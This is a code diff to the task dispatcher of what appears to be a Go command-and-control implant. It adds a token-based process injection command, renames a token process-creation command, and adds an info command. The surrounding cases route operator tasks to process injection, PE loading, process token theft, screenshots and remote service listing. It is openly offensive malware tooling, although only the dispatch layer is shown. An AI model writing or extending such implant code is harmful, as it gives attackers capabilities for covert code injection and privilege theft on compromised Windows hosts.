@@ -221,6 +221,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.SpawnInject(t.File, t.Args[0])
 	case "spawn-inject-pipe":
 		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args)
+	case "spawn-inject-token":
+		result, cmdError = processinjection.SpawnInjectWithToken(t.File, t.Args[0], t.Args[1])
 	case "load-custom-pe":
 		result, cmdError = processinjection.LoadPE(t.File, t.Args)
 	case "screenshot":
@@ -246,7 +248,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = stealtoken.StealProcessToken(t.Args[0])
 	case "cat":
 		result, cmdError = basic.CatFile(t.Args[0])
-	case "create-process-pid":
+	case "create-process-token":
 		result, cmdError = createprocess.CreateProcessWithTokenViaPid(t.Args)
 	case "create-process-creds":
 		result, cmdError = createprocess.CreateProcessWithTokenViaCreds(t.Args)
@@ -378,6 +380,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		cmdError = nil
 	case "list-remote-services":
 		result, cmdError = exectools.ListRemoteServices(t.Args[0])
+	case "info":
+		result, cmdError = Client.Info(), nil
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
